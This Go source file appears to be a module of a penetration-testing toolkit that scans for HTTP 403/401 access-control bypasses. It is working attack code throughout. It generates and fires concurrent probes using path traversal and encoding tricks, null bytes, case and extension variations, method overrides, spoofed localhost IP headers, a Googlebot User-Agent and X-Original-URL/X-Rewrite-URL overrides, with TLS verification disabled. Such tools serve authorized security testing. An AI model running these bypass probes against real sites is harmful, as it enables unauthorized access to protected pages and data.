// Package bypass403 tests HTTP 403 Forbidden bypass techniques.
//
// Source references:
//   - 403bypasser (MIT): https://github.com/yunemse48/403bypasser
//     Techniques ported: path manipulation, case variation, extension injection,
//     URL encoding, header-based bypasses.
//   - byp4xx (MIT): https://github.com/lobuhi/byp4xx
//     Techniques ported: HTTP method overrides, special header injections.
//   - 4-ZERO-3 (MIT): https://github.com/Dheerajmadhukar4/4-ZERO-3
//     Techniques ported: header injection combinations.
//
// What is implemented:
//   - Path manipulation: /path/../path, /path/./, /path%2e/, //path, etc.
//   - Case variation: /PATH, /Path, mixed case
//   - Extension injection: /path.json, /path.html, etc.
//   - URL encoding: /%2fpath, /%252fpath, etc.
//   - HTTP method overrides: X-HTTP-Method-Override, X-Method-Override
//   - Header-based bypass: X-Forwarded-For: 127.0.0.1, X-Real-IP, etc.
//   - Referer-based bypass
//   - User-Agent tricks (Googlebot, local addresses)
//   - Protocol-override headers (X-Original-URL, X-Rewrite-URL)
//   - io.LimitReader on every body read                  (dicas.md §5)
//   - log/slog structured observability                  (dicas.md §16)
//   - context propagation and cancellation               (guia-go §9)
//   - errgroup.SetLimit bounded fan-out                  (guia-go §9)
package bypass403

import (
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"strings"
	"time"

	"github.com/DonatoReis/blackhorn-modules/pkg/module"
	"golang.org/x/sync/errgroup"
)

// ─── Constants ────────────────────────────────────────────────────────────────

const (
	maxBodyRead    = 1 * 1024 * 1024 // 1 MiB — dicas.md §5
	defaultTimeout = 10 * time.Second
	defaultThreads = 15
)

// ─── PathProbe ───────────────────────────────────────────────────────────────

// PathProbe is a single bypass attempt with a modified URL + optional headers.
// Based on 403bypasser's bypass entry structure.
type PathProbe struct {
	Technique string            // human-readable technique name
	URL       string            // full probe URL
	Headers   map[string]string // extra headers to send
	Method    string            // HTTP method (default GET)
}

// ─── Module ───────────────────────────────────────────────────────────────────

// Module is the 403 bypass scanner.
type Module struct {
	client  *http.Client
	threads int
	logger  *slog.Logger
}

// New creates a Module with default settings.
func New() *Module {
	return &Module{
		client:  defaultHTTPClient(),
		threads: defaultThreads,
		logger:  slog.Default().With("module", "bypass403"),
	}
}

// NewWithClient creates a Module with a custom HTTP client.
func NewWithClient(client *http.Client) *Module {
	m := New()
	m.client = client
	return m
}

// Name implements module.Module.
func (m *Module) Name() string { return "bypass403" }

// Run implements module.Module.
// Input.Target should be the 403-protected URL (e.g. "https://example.com/admin").
func (m *Module) Run(ctx context.Context, input module.Input) ([]module.Finding, error) {
	targets := input.URLs
	if len(targets) == 0 && input.Target != "" {
		targets = []string{input.Target}
	}
	if len(targets) == 0 {
		return nil, fmt.Errorf("bypass403: at least one URL required")
	}

	m.logger.InfoContext(ctx, "starting 403 bypass probing", "targets", len(targets))

	findingsCh := make(chan module.Finding, 256)
	eg, gctx := errgroup.WithContext(ctx)
	eg.SetLimit(m.threads)

	for _, target := range targets {
		target := target
		// Only probe if the target actually returns 403 or 401.
		baseCode, err := m.checkStatus(gctx, target, nil, "GET")
		if err != nil || (baseCode != 403 && baseCode != 401) {
			continue
		}

		for _, probe := range buildProbes(target) {
			probe := probe
			if probe.Method == "" {
				probe.Method = "GET"
			}
			eg.Go(func() error {
				status, err := m.checkStatus(gctx, probe.URL, probe.Headers, probe.Method)
				if err != nil {
					return nil
				}
				if status >= 200 && status < 300 {
					f := module.Finding{
						Type:     "403_bypass",
						Severity: module.SeverityHigh,
						URL:      probe.URL,
						Detail: fmt.Sprintf("403-protected URL %q was accessed (HTTP %d) via technique: %s",
							target, status, probe.Technique),
						Extra: map[string]string{
							"technique":    probe.Technique,
							"original_url": target,
							"bypass_url":   probe.URL,
							"status_code":  fmt.Sprintf("%d", status),
							"method":       probe.Method,
							"confidence":   "0.90", // 2xx on originally-403 path with technique applied
						},
					}
					for k, v := range probe.Headers {
						f.Extra["header_"+k] = v
					}
					select {
					case findingsCh <- f:
					case <-gctx.Done():
					}
				}
				return nil
			})
		}
	}

	go func() {
		_ = eg.Wait()
		close(findingsCh)
	}()

	var results []module.Finding
	for f := range findingsCh {
		results = append(results, f)
	}
	return results, nil
}

// ─── Status check ─────────────────────────────────────────────────────────────

func (m *Module) checkStatus(ctx context.Context, rawURL string, headers map[string]string, method string) (int, error) {
	req, err := http.NewRequestWithContext(ctx, method, rawURL, nil)
	if err != nil {
		return 0, err
	}
	req.Header.Set("User-Agent", "blackhorn-bypass403/1.0")
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	resp, err := m.client.Do(req)
	if err != nil {
		return 0, err
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, io.LimitReader(resp.Body, maxBodyRead)) // dicas.md §5
	return resp.StatusCode, nil
}

// ─── Probe generation ─────────────────────────────────────────────────────────

// buildProbes returns all bypass probes for a given protected URL.
// Mirrors 403bypasser's bypass list generation.
func buildProbes(rawURL string) []PathProbe {
	var base, path string
	for _, prefix := range []string{"https://", "http://"} {
		if strings.HasPrefix(rawURL, prefix) {
			rest := rawURL[len(prefix):]
			if idx := strings.Index(rest, "/"); idx != -1 {
				base = prefix + rest[:idx]
				path = rest[idx:]
			} else {
				base = rawURL
				path = "/"
			}
			break
		}
	}
	if base == "" {
		base = rawURL
		path = "/"
	}

	u := func(p string) string { return base + p }
	var probes []PathProbe

	// ── Path manipulation ─────────────────────────────────────────────────────
	for _, v := range []struct{ name, p string }{
		{"double-slash prefix", "/" + path},
		{"dot-slash suffix", path + "/./"},
		{"dot suffix", path + "."},
		{"double-slash suffix", path + "//"},
		{"traversal", path + "/../" + lastSeg(path)},
		{"semicolon", path + ";"},
		{"question mark", path + "?"},
		{"hash", path + "#"},
		{"null byte", path + "%00"},
	} {
		probes = append(probes, PathProbe{Technique: v.name, URL: u(v.p)})
	}

	// ── URL encoding ─────────────────────────────────────────────────────────
	probes = append(probes,
		PathProbe{Technique: "URL-encode slash", URL: u(strings.ReplaceAll(path, "/", "%2f"))},
		PathProbe{Technique: "double URL-encode slash", URL: u(strings.ReplaceAll(path, "/", "%252f"))},
		PathProbe{Technique: "URL-encode dot", URL: u(strings.ReplaceAll(path, ".", "%2e"))},
	)

	// ── Case variation ────────────────────────────────────────────────────────
	probes = append(probes,
		PathProbe{Technique: "uppercase", URL: u(strings.ToUpper(path))},
		PathProbe{Technique: "mixed case", URL: u(mixedCase(path))},
	)

	// ── Extension injection ────────────────────────────────────────────────────
	for _, ext := range []string{".json", ".html", ".php", ".asp", ".txt"} {
		probes = append(probes, PathProbe{
			Technique: "extension " + ext,
			URL:       u(path + ext),
		})
	}

	// ── HTTP method overrides ─────────────────────────────────────────────────
	probes = append(probes,
		PathProbe{Technique: "X-HTTP-Method-Override: GET", URL: rawURL,
			Headers: map[string]string{"X-HTTP-Method-Override": "GET"}, Method: "POST"},
		PathProbe{Technique: "X-Method-Override: GET", URL: rawURL,
			Headers: map[string]string{"X-Method-Override": "GET"}, Method: "POST"},
		PathProbe{Technique: "TRACE method", URL: rawURL, Method: "TRACE"},
		PathProbe{Technique: "HEAD method", URL: rawURL, Method: "HEAD"},
		PathProbe{Technique: "OPTIONS method", URL: rawURL, Method: "OPTIONS"},
	)

	// ── IP header bypass ─────────────────────────────────────────────────────
	for _, header := range []string{
		"X-Forwarded-For", "X-Real-IP", "X-Client-IP",
		"X-Custom-IP-Authorization", "X-Remote-IP", "X-Originating-IP",
	} {
		for _, ip := range []string{"127.0.0.1", "localhost", "::1"} {
			h, i := header, ip
			probes = append(probes, PathProbe{
				Technique: h + ": " + i,
				URL:       rawURL,
				Headers:   map[string]string{h: i},
			})
		}
	}

	// ── Referer bypass ────────────────────────────────────────────────────────
	probes = append(probes,
		PathProbe{Technique: "Referer: target", URL: rawURL,
			Headers: map[string]string{"Referer": rawURL}},
		PathProbe{Technique: "Referer: localhost", URL: rawURL,
			Headers: map[string]string{"Referer": "http://localhost/"}},
	)

	// ── User-Agent tricks ─────────────────────────────────────────────────────
	probes = append(probes,
		PathProbe{Technique: "Googlebot UA", URL: rawURL,
			Headers: map[string]string{"User-Agent": "Googlebot/2.1 (+http://www.google.com/bot.html)"}},
	)

	// ── Protocol / Path override ──────────────────────────────────────────────
	probes = append(probes,
		PathProbe{Technique: "X-Original-URL", URL: rawURL,
			Headers: map[string]string{"X-Original-URL": path}},
		PathProbe{Technique: "X-Rewrite-URL", URL: rawURL,
			Headers: map[string]string{"X-Rewrite-URL": path}},
		PathProbe{Technique: "X-Forwarded-Proto: https", URL: rawURL,
			Headers: map[string]string{"X-Forwarded-Proto": "https"}},
	)

	return probes
}

// ─── Path helpers ─────────────────────────────────────────────────────────────

func lastSeg(path string) string {
	path = strings.TrimRight(path, "/")
	if idx := strings.LastIndex(path, "/"); idx != -1 {
		return path[idx+1:]
	}
	return path
}

func mixedCase(path string) string {
	var sb strings.Builder
	for i, c := range path {
		if i%2 == 0 {
			sb.WriteString(strings.ToUpper(string(c)))
		} else {
			sb.WriteString(strings.ToLower(string(c)))
		}
	}
	return sb.String()
}

// ─── HTTP client ─────────────────────────────────────────────────────────────

func defaultHTTPClient() *http.Client {
	return &http.Client{
		Timeout: defaultTimeout,
		Transport: &http.Transport{
			TLSClientConfig:     &tls.Config{InsecureSkipVerify: true}, //nolint:gosec
			MaxIdleConns:        30,
			MaxIdleConnsPerHost: 10,
		},
		CheckRedirect: func(_ *http.Request, _ []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
}
